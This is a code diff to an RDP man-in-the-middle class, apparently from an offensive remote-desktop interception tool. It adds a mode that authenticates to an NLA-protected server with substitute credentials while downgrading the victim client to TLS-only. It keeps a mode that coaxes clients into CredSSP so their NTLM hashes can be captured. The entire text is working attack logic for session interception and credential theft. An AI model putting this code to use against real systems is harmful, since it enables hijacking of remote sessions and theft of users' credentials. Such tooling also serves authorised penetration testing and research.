@@ -136,8 +136,13 @@ class X224MITM:
 
                     # Use redirection host and replay sequence starting from the connection request
                     self.state.useRedirectionHost()
+                elif self.state.config.replacementUsername is not None and self.state.config.replacementPassword is not None and not self.state.config.nlaFallback:
+                    # We have replacement credentials — use them to CredSSP to the server
+                    self.log.info("Server requires CredSSP/NLA. Will authenticate with replacement credentials via CredSSP.")
+                    self.state.serverRequiresNLA = True
+                    self.state.ntlmCapture = True  # Still needed to trigger NLA negotiation path
                 else:
-                    # If we are not configured to redirect then we should capture the NTLM hash
+                    # No creds available or --nla-fallback set — capture the NTLM hash and disconnect cleanly
                     self.log.info("Server requires CredSSP/NLA and we are not configured to support it. Attempting to capture client's NTLM hashes.")
                     self.state.ntlmCapture = True
 
@@ -146,8 +151,12 @@ class X224MITM:
             else:
                 self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                 payload = pdu.payload
-        elif self.state.ntlmCapture:
+        elif self.state.ntlmCapture and not self.state.serverRequiresNLA:
+            # Pure hash capture mode: tell client to use CredSSP so we can intercept the hash
             payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
+        elif self.state.serverRequiresNLA:
+            # Credential-replay mode: tell client TLS-only (we handle NLA on server side)
+            payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.SSL))
         else:
             payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))
 
